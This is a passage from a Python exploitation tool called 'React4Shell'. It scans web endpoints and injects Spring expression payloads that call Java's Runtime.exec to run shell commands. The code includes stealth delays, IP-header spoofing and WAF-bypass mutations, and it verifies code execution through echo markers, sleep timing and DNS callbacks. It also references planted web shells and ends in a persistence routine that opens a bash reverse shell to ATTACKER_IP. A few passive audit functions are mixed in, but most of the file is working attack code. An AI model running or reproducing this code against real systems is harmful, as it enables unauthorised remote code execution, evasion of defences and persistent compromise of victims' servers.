                    print(f"\n[+] Web shells accessible at: {target_url}/shell.php?cmd=id")
    return True

# ---------------------- React4Shell main scan ----------------------
def check_react4shell(target_url):
    if interrupted:
        return []
    log_event(logging.INFO, "Fingerprinting target", target=target_url)
    fingerprints = tech_fingerprint(target_url)
    discovered_subs = enumerate_subdomains(target_url)
    targets_to_probe = [target_url] + discovered_subs
    react2_results = []
    for base in targets_to_probe:
        react2_results.extend(scan_react2shell(base))

    probe_payload = '{"query": "test", "variables": null}'
    all_endpoints = prioritize_endpoints(list(set(discover_endpoints(target_url))), fingerprints)

    for endpoint in all_endpoints:
        if interrupted:
            return []
        try:
            url = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint.lstrip('/'))
            session = create_stealth_session()
            probe_headers = get_random_headers()
            apply_stealth_delay()
            try:
                head_resp = session.head(url, headers=probe_headers, timeout=3)
                if head_resp.status_code == 405:
                    pass
                elif head_resp.status_code == 404:
                    continue
            except:
                pass
            try:
                get_resp = session.get(url, headers=probe_headers, timeout=3)
                if get_resp.status_code in [200, 400, 401, 403, 500]:
                    content_type = get_resp.headers.get('Content-Type', '').lower()
                    response_text = get_resp.text.lower()
                    api_indicators = ['graphql', 'json', 'rest', 'api', 'query', 'graphiql', 'swagger']
                    if any(ind in response_text for ind in api_indicators) or 'application/json' in content_type:
                        pass
            except:
                pass
            resp = session.post(url, data=probe_payload, headers=probe_headers)
            if resp.status_code in [200, 400, 401, 403, 405, 500]:
                content_type = resp.headers.get('Content-Type', '').lower()
                response_text = resp.text.lower()
                api_indicators = ['graphql', 'json', 'rest', 'api', 'query', 'variables', 'data',
                                  'mutation', 'subscription', 'type', 'schema', 'introspection',
                                  'swagger', 'openapi', 'graphiql', 'altair', 'playground', 'voyager', 'apollo']
                headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
                header_indicators = ['graphql', 'apollo', 'hasura', 'prisma', 'spring', 'java']
                header_match = any(any(ind in v for ind in header_indicators) for v in headers_lower.values())
                if (any(ind in response_text for ind in api_indicators) or
                    'application/json' in content_type or
                    'application/graphql' in content_type or
                    header_match):
                    base_candidates = []
                    for base_payload in PAYLOADS:
                        base_candidates.extend(generate_payload_variants(base_payload))
                    for payload_index, payload in enumerate(base_candidates):
                        if interrupted:
                            return []
                        current_payload = payload
                        test_headers = get_random_headers()
                        content_type_variations = [
                            "application/json",
                            "application/json; charset=utf-8",
                            "text/json",
                            "application/graphql",
                            "application/x-www-form-urlencoded",
                            "text/plain"
                        ]
                        test_headers["Content-Type"] = random.choice(content_type_variations)
                        if test_headers["Content-Type"] == "application/x-www-form-urlencoded":
                            match = re.search(r'exec\\(\\"([^\\"]+)\\"\\)', current_payload)
                            if match:
                                cmd = match.group(1)
                                current_payload = f'query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D'
                        apply_stealth_delay()
                        mutated_body, mutated_headers = waf_engine.apply(current_payload, test_headers)
                        test_resp = session.post(url, data=mutated_body, headers=mutated_headers)
                        if test_resp.status_code in [200, 400, 500]:
                            resp_text_lower = test_resp.text.lower()
                            exploit_indicators = [
                                'uid=', 'gid=', 'groups=', 'root:', 'nobody:',
                                'bin/bash', 'bin/sh', 'etc/passwd', 'home/',
                                'java.lang', 'runtime', 'process', 'output',
                                'spel', 'expression', 'command', 'execution',
                                'directory', 'total', 'drwx', '-rw-', 'lrwx',
                                'apache', 'nginx', 'tomcat', 'spring'
                            ]
                            for indicator in exploit_indicators:
                                if indicator in resp_text_lower:
                                    return react2_results + [{
                                        'url': target_url,
                                        'endpoint': url,
                                        'status_code': test_resp.status_code,
                                        'vulnerable': 'Confirmed',
                                        'evidence': f'Found {indicator} in response',
                                        'payload_used': current_payload[:100],
                                        'timestamp': datetime.now().isoformat(),
                                        'method': 'POST',
                                        'content_type': test_headers["Content-Type"]
                                    }]
                            if test_resp.text != resp.text and len(test_resp.text) > 10:
                                error_patterns = [
                                    r'error.*command',
                                    r'cannot.*execute',
                                    r'permission denied',
                                    r'no such file',
                                    r'command not found',
                                    r'java\..*exception',
                                    r'expression.*parsing'
                                ]
                                for pattern in error_patterns:
                                    if re.search(pattern, resp_text_lower, re.IGNORECASE):
                                        return react2_results + [{
                                            'url': target_url,
                                            'endpoint': url,
                                            'status_code': test_resp.status_code,
                                            'vulnerable': 'Confirmed',
                                            'evidence': f'Error pattern: {pattern}',
                                            'payload_used': current_payload[:100],
                                            'timestamp': datetime.now().isoformat(),
                                            'method': 'POST',
                                            'content_type': test_headers["Content-Type"]
                                        }]
                                return react2_results + [{
                                    'url': target_url,
                                    'endpoint': url,
                                    'status_code': test_resp.status_code,
                                    'vulnerable': 'Unverified',
                                    'evidence': 'Payload accepted with different response',
                                    'payload_used': current_payload[:100],
                                    'timestamp': datetime.now().isoformat(),
                                    'method': 'POST',
                                    'content_type': test_headers["Content-Type"]
                                }]
                        if random.random() < 0.3:
                            apply_stealth_delay()
                            get_headers = get_random_headers()
                            get_headers["Content-Type"] = "application/x-www-form-urlencoded"
                            match = re.search(r'exec\\(\\"([^\\"]+)\\"\\)', payload)
                            if match:
                                cmd = match.group(1)
                                get_payload = {"query": f"%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D"}
                                get_resp = session.get(url, params=get_payload, headers=get_headers)
                                if get_resp.status_code in [200, 400, 500]:
                                    get_text = get_resp.text.lower()
                                    if any(ind in get_text for ind in api_indicators + exploit_indicators):
                                        return react2_results + [{
                                            'url': target_url,
                                            'endpoint': url,
                                            'status_code': get_resp.status_code,
                                            'vulnerable': 'Unverified',
                                            'evidence': 'GET request accepted with payload',
                                            'method': 'GET',
                                            'payload_used': str(get_payload),
                                            'timestamp': datetime.now().isoformat()
                                        }]
        except Exception:
            continue
    return react2_results + [{
        'url': target_url,
        'endpoint': 'N/A',
        'status_code': None,
        'vulnerable': False,
        'evidence': 'No vulnerable endpoints found',
        'timestamp': datetime.now().isoformat()
    }]

# ---------------------- Reporting and verification ----------------------
def evaluate_finding_strictness(finding):
    status = finding.get('vulnerable')
    evidence = (finding.get('evidence') or '').lower()
    payload_used = bool(finding.get('payload_used'))
    if status == 'Confirmed':
        return {'status': 'confirmed', 'confidence': 'high', 'reason_code': 'RCE_CONFIRMED_REPRODUCIBLE'}
    if status in ('Unverified', 'Potential'):
        if payload_used and any(k in evidence for k in ['payload', 'accepted', 'api indicator']):
            return {'status': 'unverified', 'confidence': 'medium', 'reason_code': 'EVIDENCE_PARTIAL_NEEDS_REPLAY'}
        return {'status': 'unverified', 'confidence': 'low', 'reason_code': 'HEURISTIC_SIGNAL_ONLY'}
    return {'status': 'not_vulnerable', 'confidence': 'low', 'reason_code': 'NO_EVIDENCE'}

def build_siem_schema_report(results, scan_mode='active'):
    findings = []
    for r in results:
        meta = evaluate_finding_strictness(r)
        findings.append({
            'target': r.get('url'),
            'endpoint': r.get('endpoint'),
            'timestamp': r.get('timestamp'),
            'status': meta['status'],
            'confidence': meta['confidence'],
            'reason_code': meta['reason_code'],
            'evidence': r.get('evidence'),
            'status_code': r.get('status_code'),
            'method': r.get('method'),
            'raw': r,
        })
    return {
        'schema_version': '1.0',
        'schema_type': 'react2shell_siem_report',
        'scan_mode': scan_mode,
        'generated_at': datetime.now().isoformat(),
        'findings': findings,
    }

def generate_report(results, output_file):
    if not results:
        return
    potential = [r for r in results if r.get('vulnerable')]
    confirmed = [r for r in potential if r.get('vulnerable') == 'Confirmed']
    potential_only = [r for r in potential if r.get('vulnerable') == 'Unverified']
    report = {
        'scan_date': datetime.now().isoformat(),
        'total_scanned': len(results),
        'confirmed_vulnerabilities': len(confirmed),
        'unverified_findings': len(potential_only),
        'results': results,
        'siem': build_siem_schema_report(results, scan_mode='active')
    }
    with open(output_file + '.json', 'w') as f:
        json.dump(report, f, indent=2)
    with open(output_file + '.txt', 'w') as f:
        f.write("=" * 70 + "\n")
        f.write("ULTIMATE REACT4SHELL SCAN RESULTS\n")
        f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 70 + "\n\n")
        if confirmed:
            f.write("CONFIRMED VULNERABILITIES FOUND:\n")
            f.write("-" * 70 + "\n")
            for i, vuln in enumerate(confirmed, 1):
                f.write(f"{i}. {vuln['url']}\n   Endpoint: {vuln['endpoint']}\n   Evidence: {vuln['evidence']}\n\n")
        if potential_only:
            f.write("UNVERIFIED FINDINGS:\n")
            f.write("-" * 70 + "\n")
            for i, vuln in enumerate(potential_only, 1):
                f.write(f"{i}. {vuln['url']}\n   Endpoint: {vuln['endpoint']}\n   Evidence: {vuln['evidence']}\n\n")
        f.write("\n" + "=" * 70 + "\nSCAN STATISTICS:\n")
        f.write(f"  Total URLs scanned: {report['total_scanned']}\n")
        f.write(f"  Confirmed vulnerabilities: {report['confirmed_vulnerabilities']}\n")
        f.write(f"  Unverified findings: {report['unverified_findings']}\n")
        f.write(f"  Safe URLs: {report['total_scanned'] - len(potential)}\n")
        payloads_used = sum(1 for r in results if 'payload_used' in r)
        f.write(f"  WAF bypass attempts: {payloads_used}\n")
    return report

def check_real_rce(target_url, endpoint, method='POST'):
    print(f"\n[+] Testing for real RCE on {target_url}")
    unique_marker = f"RCE_TEST_{random.randint(10000, 99999)}"
    print(f"[+] Test 1: Echoing unique marker '{unique_marker}'")
    cmd = f"echo {unique_marker}"
    session = create_stealth_session()
    headers = get_random_headers()
    payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
    try:
        if method.upper() == 'GET':
            params = {"query": payload}
            response = session.get(endpoint, params=params, headers=headers)
        else:
            headers['Content-Type'] = 'application/json'
            response = session.post(endpoint, data=payload, headers=headers)
        if unique_marker in response.text:
            print(f"[+] REAL RCE CONFIRMED: Found '{unique_marker}' in response!")
            return True
        else:
            print(f"[-] Unique marker not found in response")
    except Exception as e:
        print(f"[!] Error: {e}")
    print(f"\n[+] Test 2: Checking system info")
    test_commands = [
        ("whoami", "whoami output"),
        ("id", "id output"),
        ("pwd", "current directory"),
        ("uname -a", "system info"),
    ]
    for cmd, desc in test_commands:
        print(f"  Testing: {desc}...")
        time.sleep(0.5)
        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        try:
            if method.upper() == 'GET':
                params = {"query": payload}
                response = session.get(endpoint, params=params, headers=headers)
            else:
                response = session.post(endpoint, data=payload, headers=headers)
            output_indicators = {
                'whoami': ['root', 'admin', 'user', 'apache', 'nginx', 'www-data'],
                'id': ['uid=', 'gid=', 'groups='],
                'pwd': ['/', 'home/', 'var/', 'usr/'],
                'uname': ['Linux', 'Darwin', 'Windows', 'kernel']
            }
            if cmd in output_indicators:
                for indicator in output_indicators[cmd]:
                    if indicator.lower() in response.text.lower():
                        print(f"    Found '{indicator}' - possible real output")
        except:
            pass
    return False

def blind_rce_test(target_url, endpoint, method='POST'):
    print(f"\n[+] Testing for blind RCE on {target_url}")
    print("[+] Test 1: Time delay test (sleep 3)")
    session = create_stealth_session()
    headers = get_random_headers()
    start_time = time.time()
    baseline_payload = '{"query": "test"}'
    try:
        if method.upper() == 'GET':
            params = {"query": baseline_payload}
            response = session.get(endpoint, params=params, headers=headers)
        else:
            headers['Content-Type'] = 'application/json'
            response = session.post(endpoint, data=baseline_payload, headers=headers)
        baseline_time = time.time() - start_time
    except:
        baseline_time = 1.0
    sleep_commands = ["sleep 3", "ping -c 3 127.0.0.1", "timeout 3 sleep 1"]
    for sleep_cmd in sleep_commands:
        print(f"  Trying: {sleep_cmd}")
        start_time = time.time()
        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{sleep_cmd}\\")}}}}"}}'
        try:
            if method.upper() == 'GET':
                params = {"query": payload}
                response = session.get(endpoint, params=params, headers=headers, timeout=10)
            else:
                response = session.post(endpoint, data=payload, headers=headers, timeout=10)
            response_time = time.time() - start_time
            if response_time > baseline_time + 2:
                print(f"    [+] Possible blind RCE: Response took {response_time:.2f}s")
                return True
        except requests.exceptions.Timeout:
            print(f"    [+] Timeout - possible blind RCE!")
            return True
        except Exception:
            continue
    print("\n[+] Test 2: Trying to trigger external callback")
    random_token = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    test_domains = [f"{random_token}.oastify.com", f"{random_token}.burpcollaborator.net"]
    for domain in test_domains:
        dns_cmd = f"nslookup {domain} || dig {domain} || ping -c 1 {domain}"
        print(f"  Testing DNS callback to: {domain}")
        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{dns_cmd}\\")}}}}"}}'
        try:
            if method.upper() == 'GET':
                params = {"query": payload}
                response = session.get(endpoint, params=params, headers=headers, timeout=5)
            else:
                response = session.post(endpoint, data=payload, headers=headers, timeout=5)
            print(f"    Request sent. Check your collaborator for callbacks.")
            time.sleep(2)
        except:
            pass
    return False

def aggressive_waf_bypass(target_url, endpoint, method='POST', payload_template=None, command="id"):
    print(f"\n[+] Starting aggressive WAF bypass on {target_url}")
    print(f"[+] Endpoint: {endpoint}")
    print(f"[+] Command: {command}")
    results = []
    http_methods = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']
    session = create_stealth_session()
    print(f"[+] Testing {len(WAF_BYPASSES)} bypass techniques with {len(http_methods)} HTTP methods...")
    for method in http_methods:
        for technique in WAF_BYPASSES:
            if interrupted:
                return results
            try:
                payload = technique["func"](command)
                headers = get_random_headers()
                headers.update({"X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"})
                headers["Referer"] = target_url
                headers["X-Real-IP"] = headers["X-Forwarded-For"]
                headers["CF-Connecting-IP"] = headers["X-Forwarded-For"]
                if method == 'GET':
                    if "form-urlencoded" in technique.get("headers", {}).get("Content-Type", ""):
                        params = {}
                        for pair in payload.split('&'):
                            if '=' in pair:
                                key, value = pair.split('=', 1)
                                params[key] = value
                        response = session.get(endpoint, params=params, headers=headers, timeout=8)
                    else:
                        params = {"query": payload}
                        response = session.get(endpoint, params=params, headers=headers, timeout=8)
                else:
                    response = session.request(method=method, url=endpoint, data=payload, headers=headers, timeout=8)
                if response.status_code not in [403, 401]:
                    print(f"\n[!] SUCCESS: {method} + {technique['name']} - Status: {response.status_code}")
                    output_indicators = ['uid=', 'gid=', 'root:', 'bin/', 'etc/', 'home/', 'total ', 'drwx']
                    found_indicators = [ind for ind in output_indicators if ind in response.text.lower()]
                    if found_indicators:
                        print(f"[!] Command output detected: {', '.join(found_indicators)}")
                    preview = response.text[:500]
                    print(f"[+] Response preview:\n{'-'*50}\n{preview}")
                    results.append({
                        'technique': technique['name'],
                        'method': method,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'indicators': found_indicators,
                        'response_preview': preview
                    })
                    if response.status_code == 200 and found_indicators:
                        print(f"\n[+] POTENTIAL EXPLOIT SUCCESS with {technique['name']}!")
                        return results
                time.sleep(random.uniform(0.2, 0.8))
            except Exception:
                continue
    if results:
        print(f"\n[+] Found {len(results)} potential bypasses")
    else:
        print(f"\n[-] No successful bypasses found")
    return results

def _escape_java_string(value):
    return value.replace("\\", "\\\\").replace('"', '\\"')

def _build_payload_from_template(payload_template, command):
    if not payload_template or payload_template == 'N/A':
        return None
    escaped = _escape_java_string(command)
    try:
        if "COMMAND" in payload_template:
            return payload_template.replace("COMMAND", escaped)
        pattern = r'exec\\\(\\"([^\\"]*)\\"\\\)'
        match = re.search(pattern, payload_template)
        if match:
            old_cmd = match.group(1)
            return payload_template.replace(old_cmd, escaped)
    except Exception:
        return None
    return None

def _send_payload_request(session, endpoint, method, headers, payload, timeout):
    if method.upper() == 'GET':
        params = {"query": payload}
        return session.get(endpoint, params=params, headers=headers, timeout=timeout)
    if 'Content-Type' not in headers:
        headers['Content-Type'] = 'application/json'
    return session.post(endpoint, data=payload, headers=headers, timeout=timeout)

def _strict_verify_execution(session, endpoint, method, headers, timeout, payload_template=None):
    baseline_payload = json.dumps({"query": "query { __typename }"})
    try:
        baseline_resp = _send_payload_request(session, endpoint, method, headers.copy(), baseline_payload, timeout)
        baseline_text = baseline_resp.text
    except Exception:
        baseline_text = ""
    markers = [f"RCE_STRICT_{random.randint(10000, 99999)}" for _ in range(2)]
    confirmed = 0
    for marker in markers:
        attempt_command = f'echo {marker}'
        payload = _build_payload_from_template(payload_template, attempt_command)
        if not payload:
            escaped = _escape_java_string(attempt_command)
            payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\"{escaped}\")}}}}"}}'
        try:
            resp = _send_payload_request(session, endpoint, method, headers.copy(), payload, timeout)
            if marker in resp.text and marker not in baseline_text:
                confirmed += 1
        except Exception:
            continue
    return confirmed >= 2

def exploit_vulnerability(target_url, endpoint, method='POST', payload_template=None, command="id", aggressive=False, strict_verify=True):
    print(f"\n[+] Attempting to exploit {target_url}")
    print(f"[+] Endpoint: {endpoint}")
    print(f"[+] Method: {method}")
    print(f"[+] Command: {command}")
    if aggressive:
        return aggressive_waf_bypass(target_url, endpoint, method, payload_template, command)
    session = create_stealth_session()
    headers = get_random_headers()
    unique_marker = f"RCE_OUTPUT_{random.randint(10000, 99999)}"
    command_attempts = [
        f'sh -c "echo {unique_marker}; {command}; echo {unique_marker}"',
        f'/bin/sh -c "echo {unique_marker}; {command}; echo {unique_marker}"',
        f'cmd /c "echo {unique_marker} & {command} & echo {unique_marker}"',
        command,
    ]
    timeout = getattr(session, "timeout", 8)
    last_error = None
    response = None
    used_command = None
    for attempt_command in command_attempts:
        payload = _build_payload_from_template(payload_template, attempt_command)
        if payload:
            print("[+] Using adapted payload from scan template")
        else:
            escaped_attempt = _escape_java_string(attempt_command)
            payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped_attempt}\\")}}}}"}}'
        try:
            used_command = attempt_command
            response = _send_payload_request(session, endpoint, method, headers.copy(), payload, timeout)
            if response.status_code in [200, 400, 500]:
                break
        except Exception as e:
            last_error = e
            response = None
    if response is None:
        print(f"[!] Exploitation failed: {str(last_error)}")
        return None
    try:
        print(f"\n[+] Exploitation Results:")
        print(f"    Status Code: {response.status_code}")
        print(f"    Response Time: {response.elapsed.total_seconds():.2f}s")
        print(f"    Response Size: {len(response.text)} chars")
        if used_command:
            print(f"    Attempted command form: {used_command[:120]}")
        if unique_marker in response.text:
            print(f"\n[!] Marker detected: '{unique_marker}'")
            if strict_verify:
                print("[+] Running strict verification (2-marker replay + baseline control)...")
                if not _strict_verify_execution(session, endpoint, method, headers.copy(), timeout, payload_template):
                    print("[!] Strict verification failed: marker not reproducible across control checks")
                    return False
            print("[!] REAL RCE CONFIRMED under strict verification")
            pattern = f"{re.escape(unique_marker)}(.*?){re.escape(unique_marker)}"
            match = re.search(pattern, response.text, re.DOTALL)
            if match:
                command_output = match.group(1).strip()
                print(f"\n[+] Command Output:\n{'-'*50}\n{command_output[:2000]}")
                return True
        else:
            print(f"[-] Unique marker '{unique_marker}' NOT found - may be false positive")
        legacy_indicators = ['uid=', 'gid=', 'root:', '/bin/', 'etc/passwd']
        found_legacy = any(ind in response.text for ind in legacy_indicators)
        if found_legacy:
            print(f"[!] WARNING: Found legacy indicator - could be false positive")
        print(f"\n[+] Response Preview (first 500 chars):\n{'-'*50}\n{response.text[:500]}")
        html_indicators = ['<!DOCTYPE html>', '<html', '<head>', '<script>', '<body>']
        html_count = sum(1 for ind in html_indicators if ind in response.text[:500])
        if html_count >= 2:
            print(f"\n[!] CAUTION: Response appears to be HTML error page, not command output")
        return False
    except Exception as e:
        print(f"[!] Exploitation failed: {str(e)}")
        return None

def find_working_endpoint(target_url):
    print(f"[+] Searching for working endpoints on {target_url}")
    quick_endpoints = ENDPOINTS[:30]  # first 30 for speed
    session = create_stealth_session()
    headers = get_random_headers()
    probe_payload = '{"query": "test"}'
    working_endpoints = []
    for endpoint in quick_endpoints:
        if interrupted:
            break
        try:
            url = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint.lstrip('/'))
            try:
                get_resp = session.get(url, headers=headers, timeout=3)
                if get_resp.status_code in [200, 400, 401, 403, 500]:
                    content_type = get_resp.headers.get('Content-Type', '').lower()
                    if 'application/json' in content_type or 'graphql' in get_resp.text.lower():
                        working_endpoints.append({'url': url, 'method': 'GET', 'status': get_resp.status_code, 'type': 'GET endpoint'})
            except:
                pass
            try:
                post_resp = session.post(url, data=probe_payload, headers=headers, timeout=3)
                if post_resp.status_code in [200, 400, 401, 403, 405, 500]:
                    content_type = post_resp.headers.get('Content-Type', '').lower()
                    response_text = post_resp.text.lower()
                    api_indicators = ['graphql', 'json', 'rest', 'api', 'query']
                    if any(ind in response_text for ind in api_indicators) or 'application/json' in content_type:
                        working_endpoints.append({'url': url, 'method': 'POST', 'status': post_resp.status_code, 'type': 'API endpoint'})
            except:
                pass
            time.sleep(0.3)
        except Exception:
            continue
    return working_endpoints

def _marker_variants(marker):
    return {
        'plain': marker,
        'url': urllib.parse.quote(marker, safe=''),
        'double_url': urllib.parse.quote(urllib.parse.quote(marker, safe=''), safe=''),
        'base64': base64.b64encode(marker.encode()).decode(),
        'unicode': ''.join(f'\\u{ord(ch):04x}' for ch in marker),
    }

def safe_encoding_audit(target_url, endpoints=None):
    print(f"\n[+] Safe encoding audit on {target_url}")
    session = create_stealth_session()
    timeout = getattr(session, 'timeout', 8)
    if endpoints is None:
        working = find_working_endpoint(target_url)
        endpoints = [w['url'] for w in working if w.get('url')]
        if not endpoints:
            candidates = prioritize_endpoints(discover_endpoints(target_url), tech_fingerprint(target_url))
            endpoints = [urllib.parse.urljoin(target_url.rstrip('/') + '/', ep.lstrip('/')) for ep in candidates[:20]]
    endpoints = list(dict.fromkeys(endpoints))
    results = []
    for endpoint in endpoints:
        if interrupted:
            break
        marker = f"SAFE_AUDIT_{random.randint(10000, 99999)}"
        variants = _marker_variants(marker)
        endpoint_result = {'endpoint': endpoint, 'marker': marker, 'decoding_observations': [], 'status': []}
        for variant_name, variant_value in variants.items():
            headers = get_random_headers()
            headers['Content-Type'] = 'application/json'
            body = json.dumps({'audit': 'encoding-check', 'probe': variant_value, 'query': 'query Audit { __typename }', 'variables': {'probe': variant_value}})
            try:
                post_resp = session.post(endpoint, data=body, headers=headers, timeout=timeout)
                text = post_resp.text
                endpoint_result['status'].append({'method': 'POST', 'variant': variant_name, 'status_code': post_resp.status_code})
                reflected_plain = marker in text
                reflected_encoded = variant_value in text
                if reflected_plain or reflected_encoded:
                    endpoint_result['decoding_observations'].append({'method': 'POST', 'variant': variant_name, 'reflected_plain': reflected_plain, 'reflected_encoded': reflected_encoded})
            except Exception:
                pass
            try:
                params = {'probe': variant_value, 'audit': 'encoding-check'}
                get_resp = session.get(endpoint, params=params, headers=headers, timeout=timeout)
                text = get_resp.text
                endpoint_result['status'].append({'method': 'GET', 'variant': variant_name, 'status_code': get_resp.status_code})
                reflected_plain = marker in text
                reflected_encoded = variant_value in text
                if reflected_plain or reflected_encoded:
                    endpoint_result['decoding_observations'].append({'method': 'GET', 'variant': variant_name, 'reflected_plain': reflected_plain, 'reflected_encoded': reflected_encoded})
            except Exception:
                pass
        if endpoint_result['decoding_observations'] or endpoint_result['status']:
            results.append(endpoint_result)
    print(f"[+] Safe audit complete: checked {len(endpoints)} endpoints")
    return results

def _parse_log4j_versions(text):
    patterns = [r'log4j(?:-core|-api)?[^0-9]{0,8}(2\.\d+\.\d+)', r'org\.apache\.logging\.log4j[^0-9]{0,20}(2\.\d+\.\d+)']
    versions = set()
    for pat in patterns:
        for m in re.findall(pat, text, flags=re.IGNORECASE):
            versions.add(m)
    return sorted(versions)

def _is_log4j_vulnerable(version):
    try:
        parts = tuple(int(x) for x in version.split('.'))
    except Exception:
        return False
    return (2, 0, 0) <= parts <= (2, 14, 1)

def safe_log_audit(target_url):
    print(f"\n[+] Safe Log2Shell/Log4Shell audit on {target_url}")
    session = create_stealth_session()
    timeout = getattr(session, 'timeout', 8)
    base = target_url.rstrip('/')
    candidate_paths = ['/', '/actuator', '/actuator/env', '/actuator/configprops', '/actuator/loggers', '/actuator/info', '/v2/api-docs', '/v3/api-docs']
    findings = {'target': target_url, 'checked_paths': [], 'versions_detected': [], 'risk': 'low', 'evidence': []}
    for path in candidate_paths:
        url = urllib.parse.urljoin(base + '/', path.lstrip('/'))
        headers = get_random_headers()
        try:
            resp = session.get(url, headers=headers, timeout=timeout)
        except Exception:
            continue
        findings['checked_paths'].append({'path': path, 'status_code': resp.status_code})
        text = resp.text[:200000]
        lower = text.lower()
        if resp.status_code == 200 and path.startswith('/actuator'):
            findings['evidence'].append(f"Accessible management endpoint: {path}")
        if 'log4j' in lower or 'log4shell' in lower or 'jndilookup' in lower:
            findings['evidence'].append(f"Log-related indicator on {path}")
        versions = _parse_log4j_versions(text)
        if versions:
            for v in versions:
                if v not in findings['versions_detected']:
                    findings['versions_detected'].append(v)
    vulnerable_versions = [v for v in findings['versions_detected'] if _is_log4j_vulnerable(v)]
    if vulnerable_versions:
        findings['risk'] = 'high'
        findings['evidence'].append(f"Potentially vulnerable log4j versions detected: {', '.join(vulnerable_versions)}")
    elif findings['evidence']:
        findings['risk'] = 'medium'
    print(f"[+] Log audit complete: risk={findings['risk']}")
    return findings

def safe_dependency_audit(target_url):
    print(f"\n[+] Safe dependency leakage audit on {target_url}")
    session = create_stealth_session()
    timeout = getattr(session, 'timeout', 8)
    paths = ['/actuator/env', '/actuator/info', '/actuator/configprops', '/v2/api-docs', '/v3/api-docs', '/swagger-ui.html', '/swagger-ui/']
    indicators = ['spring-boot', 'log4j', 'logback', 'slf4j', 'jackson', 'tomcat', 'netty', 'hibernate', 'reactor', 'snakeyaml', 'commons-', 'org.springframework']
    results = {'target': target_url, 'leaks': []}
    for path in paths:
        url = urllib.parse.urljoin(target_url.rstrip('/') + '/', path.lstrip('/'))
        headers = get_random_headers()
        try:
            resp = session.get(url, headers=headers, timeout=timeout)
        except Exception:
            continue
        text = resp.text[:200000]
        lower = text.lower()
        found = [ind for ind in indicators if ind in lower]
        if found:
            results['leaks'].append({'path': path, 'status_code': resp.status_code, 'indicators': found[:20]})
    print(f"[+] Dependency audit complete: findings={len(results['leaks'])}")
    return results

def safe_misconfig_audit(target_url):
    print(f"\n[+] Safe misconfiguration audit on {target_url}")
    session = create_stealth_session()
    timeout = getattr(session, 'timeout', 8)
    headers = get_random_headers()
    findings = {'target': target_url, 'issues': []}
    try:
        resp = session.get(target_url, headers=headers, timeout=timeout)
        h = {k.lower(): v for k, v in resp.headers.items()}
        required = ['x-content-type-options', 'x-frame-options', 'content-security-policy']
        missing = [r for r in required if r not in h]
        if missing:
            findings['issues'].append({'type': 'missing_security_headers', 'missing': missing})
    except Exception:
        pass
    mgmt_paths = ['/actuator', '/actuator/env', '/actuator/beans', '/actuator/mappings', '/actuator/configprops']
    for path in mgmt_paths:
        url = urllib.parse.urljoin(target_url.rstrip('/') + '/', path.lstrip('/'))
        try:
            resp = session.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 200:
                findings['issues'].append({'type': 'exposed_management_endpoint', 'path': path})
        except Exception:
            continue
    print(f"[+] Misconfig audit complete: issues={len(findings['issues'])}")
    return findings

def safe_full_audit(target_url):
    encoding = safe_encoding_audit(target_url)
    log_risk = safe_log_audit(target_url)
    deps = safe_dependency_audit(target_url)
    misconfig = safe_misconfig_audit(target_url)
    strict_summary = {
        'encoding_endpoints_with_observations': sum(1 for e in encoding if e.get('decoding_observations')),
        'log_risk': log_risk.get('risk', 'low'),
        'dependency_leak_count': len(deps.get('leaks', [])),
        'misconfig_issue_count': len(misconfig.get('issues', [])),
    }
    strict_summary['overall_risk'] = 'high' if (strict_summary['log_risk'] == 'high' or strict_summary['misconfig_issue_count'] >= 3) else ('medium' if (strict_summary['encoding_endpoints_with_observations'] > 0 or strict_summary['dependency_leak_count'] > 0 or strict_summary['misconfig_issue_count'] > 0) else 'low')
    return {
        'schema_version': '1.0',
        'schema_type': 'react2shell_safe_full_audit',
        'target': target_url,
        'encoding': encoding,
        'log_risk': log_risk,
        'dependency_leakage': deps,
        'misconfiguration': misconfig,
        'strict_summary': strict_summary,
    }

def exploit_all_endpoints(target_url, command="id", aggressive=False, strict_verify=True):
    print(f"\n[+] Testing ALL endpoints ({len(ENDPOINTS)}) on {target_url}")
    print(f"[+] Command: {command}")
    print(f"[+] Aggressive mode: {aggressive}")
    results = []
    all_endpoints = list(set(ENDPOINTS))
    if len(all_endpoints) > 20:
        print(f"\n[!] You are about to test {len(all_endpoints)} endpoints")
        confirm = input("[?] Continue? (yes/no): ").strip().lower()
        if confirm not in ['yes', 'y']:
            print("[!] Operation cancelled")
            return results
    for i, endpoint_path in enumerate(all_endpoints, 1):
        if interrupted:
            break
        try:
            endpoint = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint_path.lstrip('/'))
            print(f"\n[{i}/{len(all_endpoints)}] Testing endpoint: {endpoint_path}")
            if endpoint_path.endswith('.html') or endpoint_path.endswith('.json'):
                result = exploit_vulnerability(target_url, endpoint, 'GET', command=command, aggressive=aggressive, strict_verify=strict_verify)
            else:
                result = exploit_vulnerability(target_url, endpoint, 'POST', command=command, aggressive=aggressive, strict_verify=strict_verify)
            if result:
                results.append({'endpoint': endpoint, 'result': result})
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error testing {endpoint_path}: {str(e)[:50]}")
            continue
    return results

def establish_persistence(target_url, endpoint, method='POST', payload_template=None):
    print(f"\n[+] Establishing persistence on {target_url}")
    persistence_methods = [
        {"name": "Reverse Shell (Netcat)", "command": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'", "description": "Change ATTACKER_IP"},
